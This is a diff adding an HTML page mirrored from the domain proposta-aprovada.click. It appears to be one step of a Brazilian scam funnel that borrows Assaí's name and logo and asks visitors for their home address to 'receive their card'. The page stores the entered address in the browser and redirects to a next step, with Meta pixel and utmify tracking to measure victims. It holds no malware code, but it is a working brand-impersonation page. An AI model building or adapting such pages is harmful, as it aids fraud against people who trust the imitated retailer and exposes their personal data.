@@ -1,0 +1,241 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1289289589600537');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Endereco de Entrega</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #1E3A80;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-bottom: solid 3px #ee4d2d;
+        }
+
+        .main-content {
+            max-width: 500px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+            margin: 40px auto;
+        }
+
+        .form-label {
+            font-weight: bold;
+        }
+
+        .btn-custom {
+            background-color: #1E3A80;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 15px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-custom:hover {
+            background-color: #000;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+    </style>
+    <!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1150741756723798');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1150741756723798&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+</head>
+
+<body>
+    <div class="header">
+        <img style="width: 120px;" src="images/logo.svg" alt="Logo">
+    </div>
+
+    <div class="main-content">
+        <h2>Endereco de Entrega</h2>
+        <p>Informe onde voce deseja receber seu cartao</p>
+        <form id="form-endereco">
+            <div class="mb-3">
+                <label for="cep" class="form-label">CEP</label>
+                <input type="text" class="form-control" id="cep" placeholder="00000-000" onblur="buscarCEP()">
+            </div>
+            <div class="mb-3">
+                <label for="rua" class="form-label">Rua</label>
+                <input type="text" class="form-control" id="rua" placeholder="Digite sua rua">
+            </div>
+            <div class="mb-3 d-flex align-items-center">
+                <div class="flex-grow-1 me-2">
+                    <label for="numero" class="form-label">Numero</label>
+                    <input type="text" class="form-control" id="numero">
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="sem-numero">
+                    <label class="form-check-label" for="sem-numero">Sem numero</label>
+                </div>
+            </div>
+            <div class="mb-3">
+                <label for="complemento" class="form-label">Complemento (opcional)</label>
+                <input type="text" class="form-control" id="complemento">
+            </div>
+            <div class="mb-3">
+                <label for="bairro" class="form-label">Bairro</label>
+                <input type="text" class="form-control" id="bairro">
+            </div>
+            <div class="mb-3 d-flex">
+                <div class="flex-grow-1 me-2">
+                    <label for="cidade" class="form-label">Cidade</label>
+                    <input type="text" class="form-control" id="cidade">
+                </div>
+                <div>
+                    <label for="estado" class="form-label">Estado</label>
+                    <select class="form-select" id="estado">
+                        <option value="AC">AC</option>
+                        <option value="AL">AL</option>
+                        <option value="AP">AP</option>
+                        <option value="AM">AM</option>
+                        <option value="BA">BA</option>
+                        <option value="CE">CE</option>
+                        <option value="DF">DF</option>
+                        <option value="ES">ES</option>
+                        <option value="GO">GO</option>
+                        <option value="MA">MA</option>
+                        <option value="MT">MT</option>
+                        <option value="MS">MS</option>
+                        <option value="MG">MG</option>
+                        <option value="PA">PA</option>
+                        <option value="PB">PB</option>
+                        <option value="PR">PR</option>
+                        <option value="PE">PE</option>
+                        <option value="PI">PI</option>
+                        <option value="RJ">RJ</option>
+                        <option value="RN">RN</option>
+                        <option value="RS">RS</option>
+                        <option value="RO">RO</option>
+                        <option value="RR">RR</option>
+                        <option value="SC">SC</option>
+                        <option value="SP">SP</option>
+                        <option value="SE">SE</option>
+                        <option value="TO">TO</option>
+                    </select>
+                </div>
+            </div>
+            <button type="button" class="btn-custom" onclick="salvarEndereco()">Confirmar endereco</button>
+        </form>
+    </div>
+
+    <script>
+        function buscarCEP() {
+            const cep = document.getElementById('cep').value;
+            if (cep) {
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.erro) {
+                            document.getElementById('rua').value = data.logradouro || '';
+                            document.getElementById('bairro').value = data.bairro || '';
+                            document.getElementById('cidade').value = data.localidade || '';
+                            document.getElementById('estado').value = data.uf || '';
+                        } else {
+                            console.error('CEP não encontrado.');
+                        }
+                    })
+                    .catch(() => console.error('Erro ao buscar o CEP.'));
+            }
+        }
+
+        function salvarEndereco() {
+            const endereco = {
+                cep: document.getElementById('cep').value,
+                rua: document.getElementById('rua').value,
+                numero: document.getElementById('sem-numero').checked ? 'Sem número' : document.getElementById('numero').value,
+                complemento: document.getElementById('complemento').value,
+                bairro: document.getElementById('bairro').value,
+                cidade: document.getElementById('cidade').value,
+                estado: document.getElementById('estado').value
+            };
+
+            if (!endereco.cep || !endereco.rua || !endereco.numero || !endereco.bairro || !endereco.cidade || !endereco.estado) {
+                alert('Por favor, preencha todos os campos obrigatórios.');
+                return;
+            }
+
+            localStorage.setItem('enderecoCliente', JSON.stringify(endereco));
+            window.location.href = '/12' + window.location.search;
+        }
+    </script>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright © 2025 Assaí. Todos os direitos reservados.<br>
+
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+
+
+
+</body>
+<!-- Mirrored from proposta-aprovada.click/cep by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jan 2025 01:33:41 GMT -->
+
+</html>
